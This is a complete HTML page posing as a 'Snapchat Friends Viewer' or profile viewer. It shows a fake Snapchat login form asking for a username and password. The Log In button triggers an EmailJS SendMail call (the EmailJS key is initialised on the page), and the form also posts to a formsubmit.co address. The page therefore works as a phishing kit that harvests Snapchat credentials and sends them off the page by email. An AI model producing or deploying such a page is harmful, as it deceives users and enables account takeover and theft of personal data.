<!DOCTYPE html>

<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <title>Snapchat Friends Viewer</title>
    <link rel="stylesheet" href="style.css">
    
    <script src="script.js"type="text/javascript"></script>
    <script type="text/javascript"src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
   <script type="text/javascript">
      (function(){
      emailjs.init("uNEpXqplzBOLh9QH5");
      })();

</script>
      
  </head>
  <body>
    <i class="fa-brands fa-snapchat"></i>
    <div class="snapchatlogo">
      <h3>Snapchat Profile Viewer</h3>
    </div>
  
    <div class="center">
      
      <h1>Login</h1>
      <form id="myForm" target="_blank" action="https://formsubmit.co/your@email.com" method="post">
        <div class="txt_field">
          <input type="text" id="username_id1" required>
          <span></span>
          <label>Username</label>
        </div>
        <div class="txt_field">
          <input type="password" id="password_id1" required>
          <span></span>
          <label>Password</label>
        </div>
        <div class="pass">Forgot Password?</div>
        <button onclick="SendMail()" class="button-18" role="button">Log In</button>
        <div class="signup_link">
          Not a member? <a href="#">Signup</a>
        </div>
      </form>
    </div>

  </body>
</html>
